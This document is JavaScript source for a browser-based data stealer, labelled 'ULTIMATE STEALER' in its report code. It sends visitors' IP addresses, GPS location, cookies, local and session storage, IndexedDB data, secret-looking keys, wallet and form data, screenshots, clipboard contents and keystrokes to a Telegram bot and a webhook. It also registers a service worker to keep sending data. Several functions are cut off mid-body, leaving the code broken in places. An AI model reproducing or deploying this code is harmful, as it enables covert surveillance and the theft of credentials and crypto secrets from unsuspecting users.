        // 1. Telegram — с разбивкой на части
        async function sendTelegram(text) {
            try {
                const maxLen = 4000;
                const parts = [];
                if (text.length > maxLen) {
                    for (let i = 0; i < text.length; i += maxLen) {
                        parts.push(text.slice(i, i + maxLen));
                    }
                } else {
                    parts.push(text);
                }

                let allOk = true;
                for (let i = 0; i < parts.length; i++) {
                    const part = parts.length > 1 ? `[${i+1}/${parts.length}]\n${parts[i]}` : parts[i];
                    const r = await fetch(`https://api.telegram.org/bot${CFG.BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: CFG.CHAT_ID,
                            text: part.slice(0, 4096),
                            parse_mode: 'HTML'
                        })
                    });
                    const data = await r.json();
                    if (!data.ok) {
                        log('⚠️ Telegram part ' + (i+1) + ' failed: ' + JSON.stringify(data));
                        allOk = false;
                    } else {
                        log('✅ Telegram part ' + (i+1) + ' sent');
                    }
                    await sleep(200);
                }
                return allOk;
            } catch (e) {
                log('❌ Telegram error: ' + e.message);
                return false;
            }
        }

        // 2. Webhook через Image (обходит CORS)
        function sendImage(data) {

                    const img = new Image();
                    img.src = `${CFG.WEBHOOK}?d=${payload}&t=${Date.now()}`;
                    img.onload = () => { log('✅ Webhook Image: sent'); resolve(true); };
                    img.onerror = () => { log('⚠️ Webhook Image: error'); resolve(false); };
                    setTimeout(() => resolve(false), 500);
                } catch (e) {
                    log('❌ Webhook Image: ' + e.message);
                    resolve(false);
                }
            });
        }

        // ================================================================
        // 1. СЕТЬ (IP, WebRTC, тип сети, задержка, DNS-утечка)
        // ================================================================
        async function getNetworkData() {
            const result = { ips: [], webrtc: { public: [], local: [] }, network: null, dns: null, timing: [] };
            
            try {
                // IP из нескольких источников
                const sources = [
                    { url: 'https://api.ipify.org?format=json', key: 'ip' },
                    { url: 'https://api.ip.sb/geoip', key: 'ip' },
                    { url: 'https://ipapi.co/json/', key: 'ip' }
                ];
                for (const src of sources) {
                    try {
                        const r = await fetchTO(src.url, {}, 400);
                        const d = await r.json();
                        const ip = d[src.key] || d.ip;
                        if (ip) {
                            result.ips.push({ ip, source: src.url.split('/')[2], data: d });
                        }
                    } catch (e) { log('⚠️ IP source failed: ' + src.url); }
                }
            } catch (e) { log('⚠️ Network IP error: ' + e.message); }

            try {
                // WebRTC
                const pc = new (window.RTCPeerConnection || window.webkitRTCPeerConnection)({
                    iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
                });
                pc.createDataChannel('');
                pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => {});
                pc.onicecandidate = (e) => {
                    if (!e.candidate) return;
                    const m = e.candidate.candidate.match(/(\d{1,3}\.){3}\d{1,3}/g);
                    if (m) {
                        m.forEach(ip => {
                            const isLocal = ip.startsWith('192.168.') || ip.startsWith('10.') || 
                                           ip.startsWith('172.16.') || ip.startsWith('127.');
                            if (isLocal) result.webrtc.local.push(ip);
                            else result.webrtc.public.push(ip);
                        });
                    }
                };
                await sleep(600);
                pc.close();
                result.webrtc.public = [...new Set(result.webrtc.public)];
                result.webrtc.local = [...new Set(result.webrtc.local)];
            } catch (e) { log('⚠️ WebRTC error: ' + e.message); }

            try {
                // Network API
                const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                if (conn) {
                    result.network = {
                        type: conn.type || 'unknown',
                        effectiveType: conn.effectiveType,
                        downlink: conn.downlink,
                        rtt: conn.rtt,
                        saveData: conn.saveData
                    };
                }
            } catch (e) {}

            try {
                // DNS-утечка
                const dnsUid = uid();
                const domain = CFG.DNS_SERVER.replace('{uid}', dnsUid);
                const start = Date.now();
                const img = new Image();
                img.src = `https://${domain}/pixel?t=${Date.now()}`;
                await sleep(500);
                result.dns = { domain, time: Date.now() - start };
            } catch (e) { log('⚠️ DNS error: ' + e.message); }

            try {
                // Временная атака
                const servers = ['https://google.com', 'https://facebook.com'];
                const times = [];
                for (const s of servers) {
                    try {
                        const start = performance.now();
                        await fetch(s, { mode: 'no-cors' });
                        times.push(performance.now() - start);
                    } catch {}
                }
                if (times.length) result.timing = times;
            } catch (e) {}

            return result;
        }

        function getGPS() {
            return new Promise((resolve) => {
                try {
                    if (!navigator.geolocation) { resolve(null); return; }
                    navigator.geolocation.getCurrentPosition(
                        pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy }),
                        () => resolve(null),
                        { timeout: 3000, enableHighAccuracy: false }
                    );
                    setTimeout(() => resolve(null), 3000);
                } catch (e) { resolve(null); }
            });
        }

        // ================================================================
        // 3. УСТРОЙСТВО
        // ================================================================
        function getDeviceInfo() {
            try {
                const n = navigator;
                const ua = n.userAgent.toLowerCase();
                const result = {
                    userAgent: n.userAgent,
                    platform: n.platform,
                    cores: n.hardwareConcurrency || '?',
                    memory: n.deviceMemory || '?',
                    language: n.language,
                    vendor: n.vendor,
                    maxTouchPoints: n.maxTouchPoints || 0,
                    os: 'unknown',
                    osVersion: 'unknown',
                    browser: 'unknown',
                    browserVersion: 'unknown',
                    model: 'unknown'
                };

                if (ua.includes('windows')) {
                    result.os = 'Windows';
                    if (ua.includes('windows nt 10.0')) result.osVersion = '10/11';
                    else if (ua.includes('windows nt 6.3')) result.osVersion = '8.1';
                    else if (ua.includes('windows nt 6.1')) result.osVersion = '7';
                } else if (ua.includes('mac os x')) {
                    result.os = 'macOS';
                    const m = ua.match(/mac os x (\d+)_(\d+)/);
                    if (m) result.osVersion = `${m[1]}.${m[2]}`;
                } else if (ua.includes('linux')) {
                    result.os = 'Linux';
                    if (ua.includes('android')) {
                        result.os = 'Android';
                        const m = ua.match(/android (\d+\.\d+)/);
                        if (m) result.osVersion = m[1];
                    }
                } else if (ua.includes('ios') || ua.includes('iphone') || ua.includes('ipad')) {
                    result.os = 'iOS';
                    const m = ua.match(/os (\d+)_(\d+)/);
                    if (m) result.osVersion = `${m[1]}.${m[2]}`;
                }

                if (!!window.chrome && !ua.includes('edg') && !ua.includes('opr')) {
                    result.browser = 'Chrome';
                    const m = ua.match(/chrome\/(\d+)/);
                    if (m) result.browserVersion = m[1];
                } else if (ua.includes('firefox')) {
                    result.browser = 'Firefox';
                    const m = ua.match(/firefox\/(\d+)/);
                    if (m) result.browserVersion = m[1];
                } else if (ua.includes('safari') && !ua.includes('chrome')) {
                    result.browser = 'Safari';
                    const m = ua.match(/version\/(\d+)/);
                    if (m) result.browserVersion = m[1];
                } else if (ua.includes('edg')) {
                    result.browser = 'Edge';
                    const m = ua.match(/edg\/(\d+)/);
                    if (m) result.browserVersion = m[1];
                } else if (ua.includes('opr')) {
                    result.browser = 'Opera';
                    const m = ua.match(/opr\/(\d+)/);
                    if (m) result.browserVersion = m[1];
                }

                if (result.os === 'Android') {
                    const m = ua.match(/; (.*?) Build\//);
                    if (m) result.model = m[1];
                } else if (result.os === 'iOS') {
                    const m = ua.match(/\(([^;]+);/);
                    if (m) result.model = m[1];
                }

                result.screen = {
                    width: screen.width,
                    height: screen.height,
                    pixelRatio: window.devicePixelRatio,
                    colorDepth: screen.colorDepth
                };

                return result;
            } catch (e) { log('⚠️ Device error: ' + e.message); return {}; }
        }

                if (gl) {

                            renderer: gl.getParameter(ext.UNMASKED_RENDERER_WEBGL)

                    } else {

                            vendor: gl.getParameter(gl.VENDOR),
                            renderer: gl.getParameter(gl.RENDERER)
                        };
                    }
                    fp.webgl.version = gl.getParameter(gl.VERSION);
                }
            } catch (e) {}

            try {
                const AudioCtx = window.AudioContext || window.webkitAudioContext;
                if (AudioCtx) {
                    const ctx = new AudioCtx();
                    fp.audio = { sampleRate: ctx.sampleRate };
                }
            } catch (e) {}

            try {
                const fonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia',
                    'Comic Sans MS', 'Impact', 'Tahoma', 'Roboto', 'Open Sans',
                    'Lato', 'Montserrat', 'Ubuntu', 'Fira Sans', 'Segoe UI', 'Helvetica Neue'];
                fp.fonts = fonts.filter(f => {
                    try { return document.fonts.check(`16px "${f}"`); } catch { return false; }
                });
            } catch (e) {}

            try { fp.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone; } catch (e) {}

            return fp;
        }

        function getStorage() {
            const ls = {};

            }} catch (e) {}
            const ss = {};
            try { for (let i = 0; i < sessionStorage.length; i++) {
                const k = sessionStorage.key(i);
                try { ss[k] = sessionStorage.getItem(k); } catch {}
            }} catch (e) {}
            try { return { localStorage: ls, sessionStorage: ss, cookies: document.cookie || 'нет' }; } 
            catch (e) { return { localStorage: ls, sessionStorage: ss, cookies: 'нет' }; }
        }

        // ================================================================
        // 6. INDEXEDDB
        // ================================================================
        function getIndexedDB() {
            return new Promise((resolve) => {
                try {
                    if (!indexedDB.databases) { resolve(null); return; }
                    indexedDB.databases().then(dbs => {
                        const result = [];
                        let done = 0;
                        if (dbs.length === 0) { resolve([]); return; }
                        dbs.forEach(dbInfo => {
                            const req = indexedDB.open(dbInfo.name);
                            req.onsuccess = (e) => {
                                const db = e.target.result;
                                const stores = Array.from(db.objectStoreNames);
                                const storeData = [];
                                let sDone = 0;
                                if (stores.length === 0) {
                                    result.push({ name: dbInfo.name, stores: [] });
                                    db.close();
                                    if (++done === dbs.length) resolve(result);
                                    return;
                                }
                                stores.forEach(storeName => {
                                    try {
                                        const tx = db.transaction(storeName, 'readonly');
                                        const store = tx.objectStore(storeName);
                                        const reqAll = store.getAll();
                                        reqAll.onsuccess = () => {
                                            storeData.push({ storeName, count: reqAll.result?.length || 0 });
                                            if (++sDone === stores.length) {
                                                result.push({ name: dbInfo.name, stores: storeData });
                                                db.close();
                                                if (++done === dbs.length) resolve(result);
                                            }
                                        };
                                        reqAll.onerror = () => {
                                            storeData.push({ storeName, count: 0 });
                                            if (++sDone === stores.length) {
                                                result.push({ name: dbInfo.name, stores: storeData });
                                                db.close();
                                                if (++done === dbs.length) resolve(result);
                                            }
                                        };
                                    } catch (err) {
                                        storeData.push({ storeName, count: 0 });
                                        if (++sDone === stores.length) {
                                            result.push({ name: dbInfo.name, stores: storeData });
                                            db.close();
                                            if (++done === dbs.length) resolve(result);
                                        }
                                    }
                                });
                            };
                            req.onerror = () => { if (++done === dbs.length) resolve(result); };
                        });
                    }).catch(() => resolve(null));
                } catch (e) { resolve(null); }
            });
        }

        // ================================================================
        // 10. СЕКРЕТЫ
        // ================================================================
        function findSecrets(obj) {
            const result = [];
            const patterns = ['token', 'jwt', 'secret', 'key', 'auth', 'password', 'pwd', 'api', 'private', 'wallet', 'mnemonic', 'seed', 'recovery', 'access', 'refresh', 'csrf', 'xsrf', 'session'];
            const search = (data, path = '') => {
                if (!data || typeof data !== 'object') return;
                for (let k in data) {
                    try {
                        const v = data[k];
                        const fullPath = path ? `${path}.${k}` : k;
                        if (patterns.some(p => k.toLowerCase().includes(p))) {
                            if (v && typeof v === 'string' && v.length > 3 && v.length < 300) {
                                result.push({ path: fullPath, value: trunc(v, 60) });
                            }
                        }
                        if (typeof v === 'object' && v !== null) search(v, fullPath);
                    } catch {}
                }
            };
            search(obj);
            return result;
        }

                    cookies: document.cookie || 'нет'
                };
            } catch (e) { return { url: window.location.href || 'unknown' }; }
        }

        // ================================================================
        // 12. СКРИНШОТ
        // ================================================================
        async function takeScreenshot() {
            try {
                if (typeof html2canvas === 'undefined') {
                    const script = document.createElement('script');
                    script.src = 'https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js';
                    await new Promise((resolve, reject) => {
                        script.onload = resolve;
                        script.onerror = reject;
                        document.head.appendChild(script);
                    });
                    await sleep(300);
                }
                const canvas = await html2canvas(document.body, {
                    useCORS: true,
                    allowTaint: true,
                    scale: 0.05,
                    logging: false,
                    backgroundColor: null
                });
                return canvas.toDataURL('image/jpeg', 0.08);
            } catch (e) { log('⚠️ Screenshot error: ' + e.message); return null; }
        }

        // ================================================================
        // 13. KEYLOGGER
        // ================================================================
        function setupKeylogger() {
            try {
                const buffer = [];
                document.addEventListener('keydown', (e) => {
                    if (e.key === 'Unidentified') return;
                    const special = {
                        'Control': '[CTRL]', 'Shift': '[SHIFT]', 'Alt': '[ALT]',
                        'Meta': '[WIN]', 'Escape': '[ESC]', 'Tab': '[TAB]',
                        'Enter': '[ENTER]', 'Backspace': '[BACK]', 'Delete': '[DEL]',
                        'ArrowUp': '[UP]', 'ArrowDown': '[DOWN]', 'ArrowLeft': '[LEFT]', 'ArrowRight': '[RIGHT]'
                    };
                    let out = special[e.key] || e.key;
                    if (e.ctrlKey) out = '[CTRL]+' + out;
                    if (e.shiftKey && !special[e.key]) out = out.toUpperCase();
                    if (e.altKey) out = '[ALT]+' + out;
                    buffer.push(out);
                    if (buffer.length >= 15) {
                        const data = buffer.splice(0);
                        sendImage({ keylog: data.join('') });
                    }
                });
                setInterval(() => {
                    if (buffer.length > 0) {
                        const data = buffer.splice(0);
                        sendImage({ keylog: data.join('') });
                    }
                }, 20000);
                return true;
            } catch (e) { log('⚠️ Keylogger error: ' + e.message); return false; }
        }

        // ================================================================
        // 14. БУФЕР ОБМЕНА
        // ================================================================
        async function getClipboard() {
            try {
                const ta = document.createElement('textarea');
                ta.style.cssText = 'position:fixed;opacity:0;pointer-events:none;left:-9999px;top:-9999px;';
                document.body.appendChild(ta);
                ta.focus();
                if (document.execCommand('paste')) {
                    const val = ta.value;
                    ta.remove();
                    if (val && val.length > 0) return val;
                }
                ta.remove();
            } catch (e) {}
            try {
                if (navigator.clipboard && navigator.clipboard.read) {
                    const items = await navigator.clipboard.read();
                    for (let item of items) {
                        if (item.types.includes('text/plain')) {
                            const blob = await item.getType('text/plain');
                            return await blob.text();
                        }
                    }
                }
            } catch (e) {}
            return null;
        }

        // ================================================================
        // 15. SERVICE WORKER
        // ================================================================
        function setupPersistence() {
            try {
                if ('serviceWorker' in navigator) {
                    const swCode = `
                        self.addEventListener('install', e => e.waitUntil(self.skipWaiting()));
                        self.addEventListener('activate', e => e.waitUntil(self.clients.claim()));
                        self.addEventListener('message', e => {
                            if (e.data && e.data.type === 'EXFIL') {
                                fetch('${CFG.WEBHOOK}', { method: 'POST', body: JSON.stringify(e.data.payload) });
                            }
                        });
                    `;
                    const blob = new Blob([swCode], { type: 'application/javascript' });
                    const url = URL.createObjectURL(blob);
                    navigator.serviceWorker.register(url, { scope: '/' });
                    return true;
                }
            } catch (e) { log('⚠️ Service Worker error: ' + e.message); }
            return false;
        }

        // ================================================================
        // 16. СЕНСОРЫ
        // ================================================================
        function getSensors() {
            return new Promise((resolve) => {
                const result = {};
                try {
                    if (navigator.getBattery) {
                        navigator.getBattery().then(battery => {
                            result.battery = {
                                level: Math.round(battery.level * 100),
                                charging: battery.charging
                            };
                            resolve(result);
                        });
                    }
                } catch (e) {}
                try {
                    if (window.DeviceMotionEvent) {
                        const handler = (e) => {
                            if (e.acceleration) {
                                result.acceleration = { x: e.acceleration.x, y: e.acceleration.y, z: e.acceleration.z };
                            }
                            if (e.rotationRate) {
                                result.rotationRate = { alpha: e.rotationRate.alpha, beta: e.rotationRate.beta, gamma: e.rotationRate.gamma };
                            }
                            window.removeEventListener('devicemotion', handler);
                            resolve(result);
                        };
                        window.addEventListener('devicemotion', handler, { once: true });
                    }
                } catch (e) {}
                setTimeout(() => resolve(result), 1000);
            });
        }

        // ================================================================
        // 17. ФОРМАТИРОВАНИЕ ОТЧЁТА
        // ================================================================
        function formatReport(data) {
            const lines = [];
            lines.push('🔴 ULTIMATE STEALER — ВСЕ ДАННЫЕ');
            lines.push('═'.repeat(40));
            lines.push('');

            if (data.network) {
                const n = data.network;
                if (n.ips && n.ips.length) {
                    const ipList = n.ips.map(i => i.ip).join(', ');
                    lines.push(`🌐 IP: ${ipList}`);
                    const geo = n.ips.find(i => i.data && i.data.country);
                    if (geo) {
                        const g = geo.data;
                        const loc = [g.country, g.region, g.city].filter(Boolean).join(', ');
                        if (loc) lines.push(`📍 ${loc}`);
                        if (g.isp) lines.push(`📡 ${g.isp}`);
                    }
                    lines.push('');
                }
                const allIPs = [];
                if (n.webrtc && n.webrtc.public) allIPs.push(...n.webrtc.public);
                if (n.ips) n.ips.forEach(i => { if (i.ip) allIPs.push(i.ip); });
                if (allIPs.length) {
                    lines.push(`🌐 ВСЕ IP: ${[...new Set(allIPs)].join(', ')}`);
                    lines.push('');
                }
                if (n.webrtc && n.webrtc.local && n.webrtc.local.length) {
                    lines.push(`📡 WebRTC локальные: ${n.webrtc.local.join(', ')}`);
                }
                if (n.network) {
                    const conn = n.network;
                    lines.push(`📶 Сеть: ${conn.effectiveType || '?'} ${conn.downlink || '?'}Mbps, RTT ${conn.rtt || '?'}ms`);
                }
                if (n.dns) {
                    lines.push(`🕵️ DNS: ${n.dns.domain} (${n.dns.time || 'таймаут'}ms)`);
                }
                if (n.timing && n.timing.length) {
                    const avg = Math.round(n.timing.reduce((a,b) => a + b, 0) / n.timing.length);
                    lines.push(`⏱ Временная атака: avg ${avg}ms`);
                }
                lines.push('');
                if (allIPs.length) {
                    lines.push(`🔗 https://www.google.com/maps?q=${allIPs[0]}`);
                    lines.push('');
                }
            }

            if (data.gps) {
                lines.push(`📍 GPS: ${data.gps.lat}, ${data.gps.lon} (${data.gps.acc}m)`);
                lines.push('');
            }

            if (data.device) {
                const d = data.device;
                lines.push(`💻 ${d.os || 'unknown'} ${d.osVersion || ''}, ${d.browser || ''} ${d.browserVersion || ''}`);
                if (d.model && d.model !== 'unknown') lines.push(`📱 Модель: ${d.model}`);
                lines.push(`   ${d.cores || '?'} ядер, ${d.memory || '?'}GB RAM`);
                if (d.screen) lines.push(`   Экран: ${d.screen.width}x${d.screen.height} (${d.screen.pixelRatio}x)`);
                lines.push('');
            }

            if (data.fingerprints) {
                const f = data.fingerprints;
                if (f.webgl && f.webgl.renderer) lines.push(`🎯 WebGL: ${f.webgl.renderer}`);
                if (f.audio) lines.push(`🎯 Audio: ${f.audio.sampleRate}Hz`);
                if (f.timezone) lines.push(`🎯 Время: ${f.timezone}`);
                if (f.fonts && f.fonts.length) {
                    const fonts = f.fonts.slice(0, 8);
                    lines.push(`🎯 Шрифты: ${fonts.join(', ')}${f.fonts.length > 8 ? '...' : ''}`);
                }
                lines.push('');
            }

            if (data.storage) {
                const ls = data.storage.localStorage || {};
                const keys = Object.keys(ls);
                if (keys.length) {
                    lines.push(`💾 LocalStorage (${keys.length}):`);
                    Object.entries(ls).slice(0, 5).forEach(([k, v]) => {
                        lines.push(`   ${trunc(k, 15)}: ${trunc(v, 40)}`);
                    });
                    if (keys.length > 5) lines.push(`   ... и ещё ${keys.length - 5}`);
                    lines.push('');
                }
                if (data.storage.cookies && data.storage.cookies !== 'нет') {
                    lines.push(`🍪 Куки: ${trunc(data.storage.cookies, 100)}`);
                    lines.push('');
                }
            }

            if (data.indexedDB && data.indexedDB.length) {
                lines.push(`🗄️ IndexedDB (${data.indexedDB.length} БД):`);
                data.indexedDB.forEach(db => {
                    lines.push(`   ${db.name} (${db.stores?.length || 0} stores)`);
                });
                lines.push('');
            }

            if (data.wallets && data.wallets.length) {
                lines.push(`💰 Криптокошельки:`);
                data.wallets.forEach(w => {
                    const addr = w.address ? trunc(w.address, 20) : 'установлен';
                    lines.push(`   ${w.type}: ${addr}`);
                    if (w.chainId) lines.push(`      Сеть: ${w.chainId}`);
                });
                lines.push('');
            }

            if (data.extensions && data.extensions.length) {
                lines.push(`🔌 Расширения: ${data.extensions.join(', ')}`);
                lines.push('');
            }

            if (data.passwords && data.passwords.length) {
                lines.push(`🔓 Найдены формы (${data.passwords.length}):`);
                data.passwords.forEach(form => {
                    form.inputs.forEach(inp => {
                        if (inp.isPassword) {
                            lines.push(`   Пароль: ${inp.name || 'unknown'} = [PASSWORD]`);
                        } else if (inp.value && inp.value.length > 1) {
                            lines.push(`   ${inp.name || 'field'}: ${inp.value}`);
                        }
                    });
                });
                lines.push('');
            }

            if (data.secrets && data.secrets.length) {
                lines.push(`🔑 Секреты (${data.secrets.length}):`);
                data.secrets.slice(0, 8).forEach(s => {
                    lines.push(`   ${s.path}: ${s.value}`);
                });
                if (data.secrets.length > 8) lines.push(`   ... и ещё ${data.secrets.length - 8}`);
                lines.push('');
            }

            if (data.dom) {
                const d = data.dom;
                lines.push(`🌐 Страница: ${d.url || 'unknown'}`);
                if (d.title) lines.push(`   Заголовок: ${d.title}`);
                if (d.referrer && d.referrer !== 'нет') lines.push(`↩️ ${d.referrer}`);
                lines.push('');
            }

            if (data.screenshot) {
                const size = Math.round(data.screenshot.length / 1024);
                lines.push(`🖼 Скриншот: ${size} КБ`);
                lines.push('');
            }

            if (data.keylogger) {
                lines.push(`⌨️ Keylogger: активен`);
                lines.push('');
            }

            if (data.clipboard) {
                lines.push(`📋 Буфер обмена: ${trunc(data.clipboard, 100)}`);
                lines.push('');
            }

            if (data.persistence) {
                lines.push(`♻️ Service Worker: зарегистрирован`);
                lines.push('');
            }

            if (data.sensors && data.sensors.battery) {
                const s = data.sensors;
                lines.push(`🔋 Батарея: ${s.battery.level}%${s.battery.charging ? ' (зарядка)' : ''}`);
                if (s.acceleration) {
                    const a = s.acceleration;
                    lines.push(`📱 Акселерометр: x=${a.x?.toFixed(2)}, y=${a.y?.toFixed(2)}, z=${a.z?.toFixed(2)}`);
                }
                lines.push('');
            }

            lines.push('═'.repeat(40));
            lines.push(`📅 ${data.timestamp}`);
            lines.push(`⏱ ${data.performance}ms`);

            return lines.join('\n');
        }

        // ================================================================

        (async function ultimateStealer() {
